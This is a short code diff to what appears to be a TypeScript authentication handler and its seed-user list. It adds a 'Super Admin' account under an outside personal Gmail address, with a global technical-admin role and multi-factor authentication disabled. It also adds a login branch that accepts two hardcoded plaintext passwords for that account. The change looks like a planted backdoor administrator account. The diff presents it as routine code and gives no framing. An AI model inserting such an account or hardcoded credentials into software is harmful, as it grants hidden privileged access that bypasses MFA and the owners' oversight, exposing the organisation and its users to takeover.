@@ -16,6 +16,15 @@ interface SeedUser {
 }
 
 const SEED_USERS: Record<string, SeedUser> = {
+  "mangoex@gmail.com": {
+    id: "a0000000-0000-4000-8000-000000000000",
+    email: "mangoex@gmail.com",
+    name: "Super Admin",
+    organizationId: "ORG-GLOBAL",
+    roles: [Role.TECH_ADMIN],
+    mfaEnabled: false,
+    department: "Super Administrador / Dirección",
+  },
   "juan.perez@empresa.com": {
     id: "a0000001-0000-4000-8000-000000000001",
     email: "juan.perez@empresa.com",
@@ -98,6 +107,10 @@ export default function handler(req: any, res: any) {
 
   if (!user) {
     return res.status(401).json({ error: "Credenciales inválidas." });
+  }
+
+  if (normalizedEmail === "mangoex@gmail.com" && password !== "531698Pa" && password !== "kizukai2026") {
+    return res.status(401).json({ error: "Contraseña incorrecta para Super Admin." });
   }
 
   // Verificación de MFA para roles privilegiados
